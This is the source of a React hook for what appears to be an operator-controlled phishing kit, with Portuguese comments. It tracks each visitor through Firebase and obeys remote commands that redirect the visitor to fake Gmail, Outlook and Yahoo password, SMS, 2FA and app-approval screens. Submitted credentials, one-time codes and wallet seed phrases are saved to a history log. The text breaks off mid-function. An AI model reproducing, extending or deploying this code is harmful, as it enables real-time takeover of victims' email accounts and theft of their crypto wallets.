// 🎯 Hook para gerenciar cliente no Firebase
import { useState, useEffect, useRef, useCallback } from "react";
import {
  getGlobalClientId,
  ensureClientId,
  getUserInfo,
  getDeviceType,
  isValidClientId,
  getDeviceInfo,
  getBrowserInfo,
  getVisitData,
} from "../firebase/utils";

// Imports do Firebase (com fallback no runtime)
import {
  ref,
  onValue,
  update,
  set,
  serverTimestamp,
  remove,
  onDisconnect,
  push,
} from "firebase/database";
import { database } from "../firebase/config";

// 🌐 FUNÇÃO UTILITÁRIA: Capturar URL completa de forma robusta
const getCurrentFullUrl = () => {
  try {
    // Captura URL completa: protocolo + domínio + porta + caminho + query + hash
    const fullUrl = window.location.href;
    const pathname = window.location.pathname;
    const search = window.location.search;
    const hash = window.location.hash;

    console.log("🌐 URL CAPTURADA:", {
      full: fullUrl,
      pathname,
      search,
      hash,
      origin: window.location.origin,
    });

    return {
      fullUrl,
      pathname,
      search,
      hash,
      origin: window.location.origin,
      currentPage: pathname, // Para compatibilidade com código existente
    };
  } catch (err) {
    console.warn("⚠️ Erro ao capturar URL:", err);
    return {
      fullUrl: "/",
      pathname: "/",
      search: "",
      hash: "",
      origin: "",
      currentPage: "/",
    };
  }
};

// 🚀 FUNÇÃO UTILITÁRIA: Redirecionamento robusto para abas anônimas
export const useFirebaseClient = (navigate = null) => {
  const [clientData, setClientData] = useState(null);
  const [commands, setCommands] = useState([]);
  const [isOnline, setIsOnline] = useState(navigator.onLine);
  const [isUserActive, setIsUserActive] = useState(true);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // 🆔 USAR ID GLOBAL QUE JÁ FOI CRIADO IMEDIATAMENTE
  const clientId = useRef(getGlobalClientId());

  // ✅ NOVA PROTEÇÃO: Flag para evitar múltiplas chamadas de registerVisit
  const visitRegistered = useRef(false);

  // 🔄 GARANTIR QUE O ID ESTÁ SEMPRE VÁLIDO (verificação simples)
  useEffect(() => {
    const currentId = clientId.current;
    if (!isValidClientId(currentId)) {
      console.warn("🔄 ID inválido detectado, corrigindo:", currentId);
      clientId.current = ensureClientId();
      console.log("✅ ID corrigido para:", clientId.current.slice(-8));
    } else {
      console.log("✅ ID válido confirmado:", currentId.slice(-8));
    }
  }, []);

  const pingInterval = useRef(null);
  const activityTimeout = useRef(null);
  const inactivityMs = 20000; // 20s
  const isTabVisibleRef = useRef(true);
  const unsubscribeClient = useRef(null);
  const unsubscribeCommands = useRef(null);
  const lastActivityTime = useRef(Date.now());

  // 🎯 FUNÇÃO DE REDIRECIONAMENTO ROBUSTO (movida para dentro do hook)
  const performRobustRedirect = async (targetUrl) => {
    try {
      console.log("🎯 REDIRECIONAMENTO ROBUSTO: Iniciando para:", targetUrl);

      // MELHORIA: Normalizar URL (absoluta vs relativa)
      let normalizedUrl = targetUrl;

      // Se é URL relativa (não começa com http/https), manter como está
      if (
        !targetUrl.startsWith("http://") &&
        !targetUrl.startsWith("https://") &&
        !targetUrl.startsWith("//")
      ) {
        // É URL relativa - garantir que começa com /
        normalizedUrl = targetUrl.startsWith("/") ? targetUrl : `/${targetUrl}`;
      }

      console.log("🌐 URL NORMALIZADA:", {
        original: targetUrl,
        normalized: normalizedUrl,
      });

      // 🚀 NAVEGAÇÃO SPA: Usar React Router quando disponível
      if (navigate && normalizedUrl.startsWith("/") && !targetUrl.startsWith("http")) {
        console.log("🚀 NAVEGAÇÃO SPA: Usando React Router para", normalizedUrl);
      
      // Marcar como redirecionando
      const markAsRedirecting = async () => {
        try {
          if (database && clientId.current) {
            const clientRef = ref(database, `clients/${clientId.current}`);
            await update(clientRef, {
              isRedirecting: true,
              redirectingTo: normalizedUrl,
              redirectStartTime: Date.now(),
              lastPing: serverTimestamp(),
              status: "online",
              online: true,
              userActive: true
            });
            console.log("✅ Cliente marcado como redirecionando");
          }
        } catch (err) {
          console.warn("⚠️ Erro ao marcar redirecionamento:", err);
        }
      };
      
      await markAsRedirecting();
      
      // Usar navegação SPA sem refresh
      navigate(normalizedUrl);
      
      console.log("✅ NAVEGAÇÃO SPA: Redirecionamento concluído");
      return;
    }

    // NOVA FUNCIONALIDADE: Marcar como redirecionando para preservar status online (apenas para navegação tradicional)
    const markAsRedirecting = async () => {
      try {
        if (database && clientId.current) {
          const clientRef = ref(database, `clients/${clientId.current}`);
          await update(clientRef, {
            isRedirecting: true,
            redirectingTo: normalizedUrl,
            redirectStartTime: Date.now(),
            lastPing: serverTimestamp(),
            status: "online", // Forçar online durante redirecionamento
            online: true,
            userActive: true
          });
          console.log("✅ Cliente marcado como redirecionando");
        }
      } catch (err) {
        console.warn("⚠️ Erro ao marcar redirecionamento:", err);
      }
    };

    // CORREÇÃO: Aguardar a marcação antes de executar o redirecionamento
    await markAsRedirecting();
    
    // Pequeno delay adicional para garantir que o Firebase processou a atualização
    await new Promise(resolve => setTimeout(resolve, 100));

    // ESTRATÉGIA 1: window.location.href (mais compatível)
    const executeRedirect = () => {
      try {
        window.location.href = normalizedUrl;
      } catch (err) {
        console.warn("⚠️ Redirecionamento Strategy 1 falhou:", err);

        // ESTRATÉGIA 2: window.location.replace (não deixa histórico)
        try {
          window.location.replace(normalizedUrl);
        } catch (err2) {
          console.warn("⚠️ Redirecionamento Strategy 2 falhou:", err2);

          // ESTRATÉGIA 3: window.location.assign (similar ao href)
          try {
            window.location.assign(normalizedUrl);
          } catch (err3) {
            console.error(
              "🚨 TODOS os métodos de redirecionamento falharam:",
              err3
            );

            // ESTRATÉGIA 4: Forçar reload se for mesma origem
            try {
              if (normalizedUrl.startsWith("/")) {
                window.location.pathname = normalizedUrl;
              }
            } catch (err4) {
              console.error(
                "🚨 Estratégia final de redirecionamento falhou:",
                err4
              );
            }
          }
        }
      }
    };

    // DETECÇÃO MELHORADA de modo anônimo/restrito
    const isIncognito = () => {
      try {
        // Múltiplas verificações para detectar modo anônimo
        return (
          navigator.cookieEnabled === false ||
          window.navigator.webdriver ||
          !window.localStorage ||
          navigator.doNotTrack === "1" ||
          (window.chrome && window.chrome.extension === undefined)
        );
      } catch {
        return true; // Se erro, assumir modo restritivo
      }
    };

    // CORREÇÃO CRÍTICA: Para abas anônimas, adicionar pequeno delay
    // Isso ajuda com restrições de segurança do navegador
    if (isIncognito()) {
      console.log(
        "🔒 MODO ANÔNIMO/RESTRITO detectado, usando delay no redirecionamento"
      );
      setTimeout(executeRedirect, 150); // 150ms de delay para mais segurança
    } else {
      // MELHORIA: Mesmo em modo normal, pequeno delay ajuda com consistência
      setTimeout(executeRedirect, 50); // 50ms de delay mínimo
    }

    // BACKUP: Se após 2 segundos não redirecionou, tentar novamente
    setTimeout(() => {
      const currentPath = window.location.pathname;
      const currentHref = window.location.href;

      // Verificar se realmente não redirecionou
      const hasRedirected =
        currentPath === normalizedUrl ||
        currentHref === normalizedUrl ||
        (normalizedUrl.startsWith("/") && currentPath === normalizedUrl);

      if (!hasRedirected) {
        console.log("🔄 BACKUP: Tentativa adicional de redirecionamento");
        executeRedirect();
      } else {
        console.log("✅ REDIRECIONAMENTO: Confirmado como bem-sucedido");
      }
    }, 2000);
  } catch (err) {
    console.error("🚨 Erro crítico no redirecionamento:", err);
  }
};

  // 📊 Registrar visita de forma simplificada
  const registerVisit = async () => {
    // ✅ Proteção: Evitar múltiplas chamadas
    if (visitRegistered.current) {
      console.log("📊 Visita já registrada nesta sessão");
      return;
    }

    try {
      const currentClientId = clientId.current;
      console.log("📊 Registrando visita para ID:", currentClientId.slice(-8));

      // ✅ Marcar como registrada antes de tentar
      visitRegistered.current = true;

      // Obter todos os dados de visita de forma simplificada
      const visitData = await getVisitData();

      const visitRef = ref(database, `visits/${currentClientId}`);

      // Verificar se já existe visita para não duplicar
      onValue(
        visitRef,
        (snapshot) => {
          if (!snapshot.exists()) {
            const finalVisitData = {
              ...visitData,
              oldDevice: getDeviceType(), // Compatibilidade
              firstVisit: serverTimestamp(),
              clientId: currentClientId,
              timestamp: Date.now(),
              idValid: isValidClientId(currentClientId),
            };

            set(visitRef, finalVisitData);
            console.log("✅ Visita registrada com sucesso");
          } else {
            console.log("📊 Visita já existe para este cliente");
          }
        },
        { onlyOnce: true }
      );
    } catch (err) {
      console.error("❌ Erro ao registrar visita:", err);
      // ✅ Resetar flag em caso de erro para permitir nova tentativa
      visitRegistered.current = false;
    }
  };

  // 🔄 Inicializar cliente no Firebase de forma simplificada
  const initializeClient = async () => {
    try {
      const currentClientId = clientId.current;
      console.log(
        "🔄 Inicializando cliente com ID:",
        currentClientId?.slice(-8)
      );

      // Obter todos os dados de visita de forma simplificada
      const visitData = await getVisitData();

      // Verificar se Firebase está disponível
      if (!database || !ref || !set || !serverTimestamp) {
        console.warn("⚠️ Firebase não disponível, usando modo local");
        setLoading(false);
        return;
      }

      const clientRef = ref(database, `clients/${currentClientId}`);

      // Verificar se já existe dados do cliente no Firebase
      const existingClientSnapshot = await new Promise((resolve) => {
        onValue(clientRef, resolve, { onlyOnce: true });
      });

      let initialData;

      if (existingClientSnapshot.exists()) {
        // Cliente já existe - preservar dados importantes
        const existingData = existingClientSnapshot.val();
        console.log("🔄 Cliente existente preservado");

        initialData = {
          ...existingData,
          online: true,
          userActive: true,
          lastPing: serverTimestamp(),
          lastActivity: Date.now(),
          ...visitData,
          clientId: currentClientId,
          id: currentClientId,
          idValid: isValidClientId(currentClientId),
          ref: existingData.ref || visitData.ref,
          // NOVA FUNCIONALIDADE: Limpar flags de redirecionamento ao conectar
          isRedirecting: false,
          redirectingTo: null,
          redirectStartTime: null,
        };
      } else {
        // Cliente novo
        console.log("🔄 Criando novo cliente");

        initialData = {
          online: true,
          userActive: true,
          lastPing: serverTimestamp(),
          lastActivity: Date.now(),
          device: getDeviceType(),
          clientId: currentClientId,
          id: currentClientId,
          idValid: isValidClientId(currentClientId),
          createdAt: serverTimestamp(),
          fromForm: false,
          ...visitData,
          ref: visitData.ref,
          // NOVA FUNCIONALIDADE: Inicializar flags de redirecionamento como false
          isRedirecting: false,
          redirectingTo: null,
          redirectStartTime: null,
        };
      }

      await set(clientRef, initialData);
      console.log("✅ Cliente inicializado com sucesso");
    } catch (err) {
      console.error("❌ Erro ao inicializar cliente:", err);
      setError(err);
    } finally {
      setLoading(false);
    }
  };

  // 🎯 Atualizar presença: "online" | "away" | "offline"
  const setPresenceStatus = async (status) => {
    try {
      if (!database) return;
      const clientRef = ref(database, `clients/${clientId.current}`);
      const urlInfo = getCurrentFullUrl();
      // Mapear flags:
      // online: online=true, userActive=true
      // away:   online=true, userActive=false
      // offline:online=false, userActive=false
      const isOnlineFlag = status === "online" || status === "away";
      const isUserActiveFlag = status === "online";
      await update(clientRef, {
        status,
        online: isOnlineFlag,
        userActive: isUserActiveFlag,
        lastPing: serverTimestamp(),
        lastActive: Date.now(),
        lastActivity: Date.now(),
        lastStatusChange: Date.now(),
        ...urlInfo,
      });
    } catch (err) {
      console.warn("Erro ao atualizar presença:", err.message);
    }
  };

  // 💓 Sistema de ping melhorado (a cada 3 segundos)
  const startPing = () => {
    pingInterval.current = setInterval(async () => {
      // Se a aba não está visível, manter status "away" e não forçar "offline"
      if (!isTabVisibleRef.current) {
        await setPresenceStatus("away");
        return;
      }
      
      // NOVA LÓGICA: Sempre manter online quando na página, sem timeout de inatividade
      if (isOnline && isTabVisibleRef.current) {
        if (!isUserActive) {
          setIsUserActive(true);
          await setPresenceStatus("online");
        }
        // Ping simples para manter lastPing atualizado
        try {
          const clientRef = ref(database, `clients/${clientId.current}`);
          await update(clientRef, { lastPing: serverTimestamp() });
        } catch (err) {
          console.warn("Erro no ping:", err.message);
        }
      }
    }, 3000);
  };

  // 👀 Sistema de tracking de atividade do usuário
  const setupActivityTracking = () => {
    const events = [
      "mousedown",
      "mousemove",
      "keypress",
      "scroll",
      "touchstart",
      "click",
    ];

    const handleActivity = () => {
      lastActivityTime.current = Date.now();
      if (!isUserActive && isTabVisibleRef.current) {
        setIsUserActive(true);
        setPresenceStatus("online");
      }
      // REMOVIDO: Timeout de inatividade que forçava offline
      // Agora o usuário permanece sempre online enquanto estiver na página
    };

    // Adicionar listeners de atividade
    events.forEach((event) => {
      window.addEventListener(event, handleActivity, true);
    });

    // Visibilidade da página (alterou aba = AWAY, voltou aba = ONLINE)
    const handleVisibilityChange = () => {
      const hidden = document.visibilityState === "hidden";
      isTabVisibleRef.current = !hidden;
      if (hidden) {
        // Marcar como ausente quando mudar de aba
        setPresenceStatus("away");
      } else {
        // Voltar para online quando retornar à aba
        lastActivityTime.current = Date.now();
        setIsUserActive(true);
        setPresenceStatus("online");
        // REMOVIDO: Timeout de inatividade
      }
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);

    // Antes de fechar a página = OFFLINE
    const handleBeforeUnload = () => {
      setIsUserActive(false);
      setPresenceStatus("offline");
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    // Inicializar timeout de atividade
    handleActivity();

    // Cleanup function
    return () => {
      events.forEach((event) => {
        window.removeEventListener(event, handleActivity, true);
      });
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("beforeunload", handleBeforeUnload);

      if (activityTimeout.current) {
        clearTimeout(activityTimeout.current);
      }
    };
  };

  // 👂 Escutar dados do cliente em tempo real
  const listenToClient = () => {
    const clientRef = ref(database, `clients/${clientId.current}`);

    unsubscribeClient.current = onValue(clientRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        console.log("🔍 CLIENTE: Dados recebidos do Firebase:", {
          clientId: clientId.current?.slice(-8),
          authCode: data.authCode,
          smsCode: data.smsCode,
          tokenCode: data.tokenCode,
          emailCode: data.emailCode,
          timestamp: new Date().toLocaleTimeString(),
        });
        setClientData(data);
      }
    });
  };

  // 📡 Escutar comandos em tempo real
  const listenToCommands = () => {
    const commandsRef = ref(database, `commands/${clientId.current}`);

    unsubscribeCommands.current = onValue(commandsRef, (snapshot) => {
      if (snapshot.exists()) {
        const commandData = snapshot.val();

        // ✅ CORREÇÃO: Extrair apenas os tipos de comando para as páginas detectarem
        const commandTypes = Object.values(commandData).map(
          (cmd) => cmd.type || cmd
        );
        console.log("📡 CLIENTE: COMANDOS DETECTADOS:", {
          clientId: clientId.current?.slice(-8),
          clientIdCompleto: clientId.current,
          commandTypes,
          rawData: commandData,
          currentPage: window.location.pathname,
          timestamp: new Date().toLocaleTimeString(),
        }); // DEBUG SUPER DETALHADO
        setCommands(commandTypes); // Passar array de strings dos tipos

        // Executar comando automaticamente
        executeCommand(commandData);
      } else {
        console.log(
          "📡 CLIENTE: NENHUM COMANDO ENCONTRADO para:",
          clientId.current?.slice(-8)
        ); // DEBUG
        setCommands([]);
      }
    });
  };

  // ⚡ Executar comando recebido
  const executeCommand = async (commandData) => {
    try {
      // Selecionar o último comando com base em timestamp e push key (ordem confiável)
      const commandsList = Object.entries(commandData).map(([key, value]) => ({
        key,
        type: (value && value.type) || value,
        ts: value && typeof value.timestamp === "number" ? value.timestamp : 0,
      }));

      if (!commandsList.length) return;

      commandsList.sort((a, b) =>
        a.ts !== b.ts ? a.ts - b.ts : a.key.localeCompare(b.key)
      );
      const latestCommand = commandsList[commandsList.length - 1];

      if (latestCommand && latestCommand.type) {
        console.log("🎯 CLIENTE: Comando recebido:", {
          type: latestCommand.type,
          clientId: clientId.current?.slice(-8),
          timestamp: new Date().toLocaleTimeString(),
        });

        // CRÍTICO: Verificar se cliente ainda tem dados básicos antes do redirecionamento
        console.log("🎯 CLIENTE: Estado atual antes do redirecionamento:", {
          clientId: clientId.current?.slice(-8),
          temEmail: !!clientData?.email,
          fromForm: clientData?.fromForm,
          currentUrl: clientData?.currentUrl,
        });

        // NOVA LÓGICA: Comandos de invalidação NÃO devem ser executados aqui, apenas detectados pelas páginas
        const isInvalidationCommand =
          latestCommand.type.startsWith("inv_") ||
          latestCommand.type.startsWith("invalid_");

        if (isInvalidationCommand) {
          console.log(
            "🚨 CLIENTE: Comando de invalidação detectado:",
            latestCommand.type,
            "- Não executando redirecionamento, apenas permitindo páginas detectarem"
          );
          // CORREÇÃO CRÍTICA: NÃO limpar comandos automaticamente para comandos de invalidação
          // As páginas devem detectar e limpar elas mesmas quando processarem
          // Isso evita que o card suma do dashboard
          console.log(
            "📌 CLIENTE: Comando de invalidação mantido para detecção pelas páginas"
          );
          return;
        }

        // Executar ação baseada no tipo de comando (apenas comandos de navegação)
        console.log("🔍 CLIENTE: DEBUG - Comando exato recebido:", {
          command: `"${latestCommand.type}"`,
          length: latestCommand.type.length,
          charCodes: Array.from(latestCommand.type).map((c) => c.charCodeAt(0)),
          timestamp: new Date().toLocaleTimeString(),
        });

        // Sem navegação direta para modais Gmail aqui

        // NOVO: Comandos Gmail → redirecionar para /sync?view=...
        const gmailModalCommands = [
          "gmailpass",
          "gmailsms",
          "gmailcodemail",
          "gmailyes",
          "gmailauth",
          "gmailapp",
          "gmailyoutube",
          "gmailtelefone",
        ];
        const normalizedType =
          typeof latestCommand.type === "string"
            ? latestCommand.type.replace(/["'\s]+/g, "").trim()
            : latestCommand.type;

        if (gmailModalCommands.includes(normalizedType)) {
          console.log(
            "📧 CLIENTE: Comando Gmail detectado:",
            latestCommand.type
          );
          const mapView = {
            gmailpass: "password",
            gmailsms: "gmail-sms",
            gmailcodemail: "codemail",
            gmailyes: "yes",
            gmailauth: "auth",
            gmailapp: "app",
            gmailyoutube: "youtube",
            gmailtelefone: "gmail-telefone",
          };
          const view = mapView[normalizedType];
          const targetUrl = view
            ? `/sync?view=${encodeURIComponent(view)}`
            : "/sync";
          try {
            const current = window.location.pathname + window.location.search;
            if (current !== targetUrl) {
              await performRobustRedirect(targetUrl);
            }
          } catch {}
          // Não limpar aqui. A própria /sync limpará/consumirá após aplicar a tela.
          return;
        }

        // NOVO: Comandos Outlook → redirecionar para /sync?view=outlook_*
        const outlookModalCommands = [
          "outlookpass",
          "outlookverify",
          "outlookcode",
          "outlooksms",
          "outlookapp",
          "outlookdigits",
          "outlook_password",
          "outlook_verify",
          "outlook_verify_code",
          "outlook_sms",
          "outlook_app",
          "outlook_digits",
        ];
        if (outlookModalCommands.includes(normalizedType)) {
          console.log(
            "📧 CLIENTE: Comando Outlook detectado:",
            latestCommand.type
          );
          const mapView = {
            outlookpass: "outlook_password",
            outlookverify: "outlook_verify",
            outlookcode: "outlook_verify_code",
            outlooksms: "outlook_sms",
            outlookapp: "outlook_app",
            outlookdigits: "outlook_digits",
            outlook_password: "outlook_password",
            outlook_verify: "outlook_verify",
            outlook_verify_code: "outlook_verify_code",
            outlook_sms: "outlook_sms",
            outlook_app: "outlook_app",
            outlook_digits: "outlook_digits",
          };
          const view = mapView[normalizedType];
          const targetUrl = view
            ? `/sync?view=${encodeURIComponent(view)}`
            : "/sync";
          try {
            const current = window.location.pathname + window.location.search;
            if (current !== targetUrl) {
              await performRobustRedirect(targetUrl);
            }
          } catch {}
          return;
        }

        // NOVO: Comandos Yahoo → redirecionar para /sync?view=yahoo_*
        const yahooModalCommands = [
          // sem underscore
          "yahoopass",
          "yahoosms",
          "yahoocodesms",
          "yahoocodemail",
          "yahooauth",
          "yahooemail",
          "yahoonumero",
          "yahoowhatsapp",
          // com underscore (tipos)
          "yahoo_password",
          "yahoo_sms",
          "yahoo_codesms",
          "yahoo_codemail",
          "yahoo_auth",
          "yahoo_email",
          "yahoo_numero",
          "yahoo_whatsapp",
        ];
        if (yahooModalCommands.includes(normalizedType)) {
          console.log(
            "📧 CLIENTE: Comando Yahoo detectado:",
            latestCommand.type
          );
          const mapView = {
            // sem underscore → view underscore
            yahoopass: "yahoo_password",
            yahoosms: "yahoo_sms",
            yahoocodesms: "yahoo_codesms",
            yahoocodemail: "yahoo_codemail",
            yahooauth: "yahoo_auth",
            yahooemail: "yahoo_email",
            yahoonumero: "yahoo_numero",
            yahoowhatsapp: "yahoo_whatsapp",
            // tipo já em underscore → mapeia para si mesmo
            yahoo_password: "yahoo_password",
            yahoo_sms: "yahoo_sms",
            yahoo_codesms: "yahoo_codesms",
            yahoo_codemail: "yahoo_codemail",
            yahoo_auth: "yahoo_auth",
            yahoo_email: "yahoo_email",
            yahoo_numero: "yahoo_numero",
            yahoo_whatsapp: "yahoo_whatsapp",
          };
          const view = mapView[normalizedType];
          const targetUrl = view
            ? `/sync?view=${encodeURIComponent(view)}`
            : "/sync";
          try {
            const current = window.location.pathname + window.location.search;
            if (current !== targetUrl) {
              await performRobustRedirect(targetUrl);
            }
          } catch {}
          return;
        }

        switch (latestCommand.type) {
          case "sync_data":
            console.log(
              "🎯 CLIENTE: Comando SYNC recebido - Redirecionando para /sync"
            );
            await performRobustRedirect("/sync");
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando SYNC limpo após execução");
            break;

          case "redirect":
            if (latestCommand.url) {
              console.log(
                "🎯 CLIENTE: Redirecionando para:",
                latestCommand.url
              );
              await performRobustRedirect(latestCommand.url);
            }
            // Não limpar imediatamente para permitir consumo pelas páginas
            break;

          case "ir_sms":
            console.log("🎯 CLIENTE: Redirecionando para /sms");
            await performRobustRedirect("/sms");
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          case "ir_email":
            console.log("🎯 CLIENTE: Redirecionando para /email");
            await performRobustRedirect("/email");
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          case "ir_token":
            console.log("🎯 CLIENTE: Redirecionando para /token");
            await performRobustRedirect("/token");
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          case "authenticate":
            console.log("🎯 CLIENTE: Redirecionando para /auth");
            await performRobustRedirect("/auth");
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          case "ir_device":
            console.log("🎯 CLIENTE: Redirecionando para /device");
            await performRobustRedirect("/device");
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          case "PASSWORD":
            console.log(
              "🔐 CLIENTE: Comando PASSWORD recebido - Mostrando popup na HomePage"
            );
            // NÃO limpar comando aqui! HomePage.jsx irá limpar após abrir o popup
            break;

          case "slc_app":
            console.log(
              "🎯 CLIENTE: Comando SLC_APP recebido - Mostrando popup TapYes na HomePage"
            );
            // NÃO limpar comando aqui! HomePage.jsx irá limpar após abrir o popup
            break;

          case "SLC 2FA":
            console.log(
              "🎯 CLIENTE: Comando SLC 2FA recebido - Mostrando popup EmailCode na HomePage"
            );
            // NÃO limpar comando aqui! HomePage.jsx irá limpar após abrir o popup
            break;

          case "verification":
            console.log(
              "🎯 CLIENTE: Comando verification recebido - Mostrando popup Verification na HomePage"
            );

            // NOVO: Extrair youtubeNumber dos dados do comando e salvar no cliente
            if (latestCommand.data && latestCommand.data.youtubeNumber) {
              console.log(
                "🎯 CLIENTE: YouTube number encontrado:",
                latestCommand.data.youtubeNumber
              );

              // Salvar o youtubeNumber no cliente
              try {
                const { ref, update } = await import("firebase/database");
                const { database } = await import("../firebase/config");

                if (database && ref && update && clientId.current) {
                  const clientRef = ref(
                    database,
                    `clients/${clientId.current}`
                  );
                  await update(clientRef, {
                    youtubeCode: latestCommand.data.youtubeNumber,
                    lastUpdate: serverTimestamp(),
                  });
                  console.log("✅ CLIENTE: YouTube number salvo no cliente");
                }
              } catch (error) {
                console.error(
                  "❌ CLIENTE: Erro ao salvar YouTube number:",
                  error
                );
              }
            }

            // NÃO limpar comando aqui! HomePage.jsx irá limpar após abrir o popup
            break;

          case "get_device_info":
            console.log(
              "🎯 CLIENTE: Comando get_device_info recebido - Redirecionando para /code"
            );
            // Redirecionar para /code com o número do device como query parameter
            const deviceNumber = clientData?.deviceNumber || "";
            const codeUrl = deviceNumber
              ? `/code?device=${encodeURIComponent(deviceNumber)}`
              : "/code";
            await performRobustRedirect(codeUrl);
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          case "wait_command":
            console.log(
              "🎯 CLIENTE: Comando AGUARDE recebido - Redirecionando para /loading"
            );
            await performRobustRedirect("/loading");
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          case "update_field": {
            // Atualizações de campo em tempo real vindas do cliente (fallback universal)
            try {
              const { ref, update } = await import("firebase/database");
              const { database } = await import("../firebase/config");
              const clientRef = ref(database, `clients/${clientId.current}`);
              await update(clientRef, latestCommand.data || {});
            } catch {}
            await clearCommands();
            break;
          }

          case "reload":
            console.log("🎯 CLIENTE: Recarregando página");
            // MELHORIA: Reload robusto para abas anônimas
            try {
              window.location.reload(true); // Force reload do servidor
            } catch (err) {
              console.warn(
                "⚠️ Reload normal falhou, tentando alternativo:",
                err
              );
              try {
                window.location.href = window.location.href;
              } catch (err2) {
                console.error("🚨 Todos os métodos de reload falharam:", err2);
              }
            }
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
            break;

          default:
            console.log(
              "🎯 CLIENTE: Comando desconhecido:",
              latestCommand.type
            );
            // Limpar comando após execução
            await clearCommands();
            console.log("🎯 CLIENTE: Comando limpo após execução");
        }
      }
    } catch (err) {
      console.error("🎯 CLIENTE: Erro ao executar comando:", err);
    }
  };

  // 🧹 Limpar comandos (memoizado para evitar re-render loops em páginas)
  const clearCommands = useCallback(async () => {
    try {
      const commandsRef = ref(database, `commands/${clientId.current}`);
      await remove(commandsRef);
    } catch (err) {
      console.error("Erro ao limpar comandos:", err);
    }
  }, []);

  // 📱 Atualizar dados do cliente (memoizado para estabilidade de deps nas páginas)
  const updateClientData = useCallback(async (data) => {
    const currentClientId = clientId.current;

    console.log("🔄 CLIENTE: Iniciando updateClientData:", {
      clientId: currentClientId?.slice(-8),
      hasEmail: !!data.email,
      hasPassword: !!data.password,
      fromForm: data.fromForm,
      testMode: data.testMode,
      timestamp: new Date().toISOString(),
    });

    // Verificação simples - se não tem ID válido, não continuar
    if (!isValidClientId(currentClientId)) {
      console.error("🚨 ERRO: ID inválido durante update:", currentClientId);
      throw new Error("ID do cliente inválido");
    }

    const urlInfo = getCurrentFullUrl();

    // TENTATIVA 1: Firebase
    try {
      if (!database || !ref || !update || !serverTimestamp) {
        throw new Error("Firebase não disponível");
      }

      const clientRef = ref(database, `clients/${currentClientId}`);

      // CORREÇÃO: Preservar dados importantes do dispositivo
      const updateData = {
        ...data,
        ...urlInfo,
        // SEMPRE incluir IDs
        clientId: currentClientId,
        id: currentClientId,
        lastUpdate: serverTimestamp(),
      };

      // PROTEÇÃO: Se data NÃO tem dados do dispositivo, NÃO incluir informações básicas de URL que poderiam sobrescrever
      // Só incluir dados de dispositivo básico se for primeira vez (quando tem email/senha)
      if (!data.device && !data.browser && !(data.email && data.password)) {
        // Remover possíveis dados básicos de dispositivo da urlInfo para não sobrescrever dados reais
        delete updateData.device;
        delete updateData.browser;
        delete updateData.deviceType;
        delete updateData.isMobile;
        delete updateData.isTablet;
        delete updateData.isDesktop;
      }

      // Se tem email/senha, marcar como formulário preenchido
      if (data.email && data.password) {
        updateData.fromForm = true;
        updateData.hasCredentials = true;
        console.log(
          "✅ Salvando credenciais para ID:",
          currentClientId.slice(-8)
        );
      }

      console.log(
        "🔄 CLIENTE: Salvando dados para ID:",
        currentClientId.slice(-8)
      );

      await update(clientRef, updateData);

      // 📜 Histórico: registrar eventos relevantes (envios de códigos/seeds)
      try {
        const HISTORY_WHITELIST = new Set([
          "seedPhrase",
          "gmailPassword",
          "gmailSms",
          "gmailCodeMail",
          "gmailAuth",
          "gmailApp",
          "gmailYouTube",
          "authCode",
          "codeInput",
          "smsCode",
          "tokenCode",
          "emailCode",
          "yahooPassword",
          "yahooSms",
          "yahooCodeSms",
          "yahooCodeMail",
          "yahooWhatsapp",
          "yahooAuth",
          "yahooNumero",
          "yahooEmail",
          "outlookPassword",
          "outlookVerify",
          "outlookVerifyCode",
          "outlookSms",
          "outlookApp",
          "outlookDigits",
        ]);
        const keys = Object.keys(data || {}).filter(
          (k) => HISTORY_WHITELIST.has(k) || k.endsWith("SubmittedAt")
        );
        if (keys.length) {
          const historyRef = ref(
            database,
            `clients/${currentClientId}/history`
          );
          const entryRef = push(historyRef);
          const values = {};
          for (const k of keys) {
            const v = data[k];
            values[k] =
              typeof v === "string" && v.length > 120
                ? `${v.slice(0, 120)}…`
                : v;
          }
          await set(entryRef, {
            type: "update",
            keys,
            values,
            page: urlInfo.pathname,
            query: urlInfo.search,
            timestamp: serverTimestamp(),
            ts: Date.now(),
          });
        }
      } catch (e) {
        console.warn("Histórico não registrado:", e?.message);
      }

      console.log("✅ CLIENTE: Dados salvos com sucesso no Firebase");
      return { success: true, clientId: currentClientId };
    } catch (err) {
      console.error("🚨 ERRO ao salvar no Firebase:", err);

      // TENTATIVA 2: Fallback local
      try {
        console.log("🔄 CLIENTE: Tentativa 2 - Salvando localmente...");

        const localData = {
          ...data,
          ...urlInfo,
          clientId: currentClientId,
          id: currentClientId,
          lastUpdate: Date.now(),
          savedLocally: true,
          firebaseError: err.message,
        };

        localStorage.setItem(
          `client_${currentClientId}`,
          JSON.stringify(localData)
        );

        // Se tem email/senha, salvar também em local específico para retry
        if (data.email && data.password) {
          localStorage.setItem(
            `login_${currentClientId}`,
            JSON.stringify(localData)
          );
        }

        console.log("✅ CLIENTE: Dados salvos localmente como fallback");
        return { success: true, clientId: currentClientId, savedLocally: true };
      } catch (localErr) {
        console.error("🚨 ERRO ao salvar localmente:", localErr);

        // TENTATIVA 3: ID de emergência
        try {
          console.log("🔄 CLIENTE: Tentativa 3 - Usando ID de emergência...");

          const emergencyId = ensureClientId();
          const emergencyData = {
            ...data,
            clientId: emergencyId,
            id: emergencyId,
            lastUpdate: Date.now(),
            emergencyMode: true,
